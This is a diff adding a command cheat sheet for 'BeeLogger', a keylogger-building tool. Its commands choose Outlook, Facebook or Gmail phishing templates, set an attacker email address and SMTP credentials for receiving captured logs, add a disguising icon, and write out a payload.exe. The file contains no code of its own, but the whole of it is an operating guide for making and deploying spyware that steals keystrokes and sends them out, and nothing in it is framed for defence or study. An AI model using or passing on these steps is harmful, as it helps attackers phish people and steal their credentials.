@@ -1,0 +1,58 @@
+[X] BeeLogger Command List
+
+[\] python3 bee.py
+[/] Launch BeeLogger main menu
+
+[\] python3 bee.py --help
+[/] Show help menu
+
+[\] python3 bee.py --update
+[/] Update BeeLogger to latest version
+
+[\] python3 bee.py --setup
+[/] Install dependencies and configure environment
+
+[\] python3 bee.py --list
+[/] List available keylogger templates
+
+[\] python3 bee.py --template outlook
+[/] Use Outlook‑style phishing template
+
+[\] python3 bee.py --template facebook
+[/] Use Facebook‑style phishing template
+
+[\] python3 bee.py --template gmail
+[/] Use Gmail‑style phishing template
+
+[\] python3 bee.py --template custom
+[/] Use custom HTML template
+
+[\] python3 bee.py --email attacker@example.com
+[/] Set email for receiving logs
+
+[\] python3 bee.py --smtp smtp.example.com
+[/] Set SMTP server
+
+[\] python3 bee.py --port 587
+[/] Set SMTP port
+
+[\] python3 bee.py --ssl
+[/] Enable SSL for SMTP
+
+[\] python3 bee.py --user smtpuser
+[/] SMTP username
+
+[\] python3 bee.py --pass smtppass
+[/] SMTP password
+
+[\] python3 bee.py --icon icon.ico
+[/] Add custom icon to payload
+
+[\] python3 bee.py --output payload.exe
+[/] Save generated keylogger payload
+
+[\] python3 bee.py --debug
+[/] Enable debug mode
+
+[\] python3 bee.py --clean
+[/] Remove temporary files
